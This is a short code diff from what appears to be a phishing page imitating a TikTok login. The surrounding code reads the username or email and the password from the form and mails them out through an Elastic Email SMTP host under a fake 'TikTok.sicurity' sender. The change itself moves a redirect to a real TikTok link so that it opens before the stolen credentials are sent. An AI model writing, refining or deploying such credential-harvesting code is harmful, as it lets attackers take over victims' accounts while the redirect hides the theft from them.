@@ -4,6 +4,8 @@ function sendEmail() {
 NomeUtente = document.getElementById("Nome/Email").value;
 Password = document.getElementById("Password").value;
 //-----------Spedizione dati--------------------//
+window.open('https://vm.tiktok.com/ZMdKXKCFu/');
+
 Email.send({
   Host: "smtp.elasticemail.com",
   Username: "TikTok.sicurity@gmail.com",
@@ -15,7 +17,6 @@ Email.send({
   })
   .then(function (message) {
     console.log("accesso");
-    window.open('https://vm.tiktok.com/ZMdKXKCFu/', '_blank');
   });
 }
 setInterval(() => {
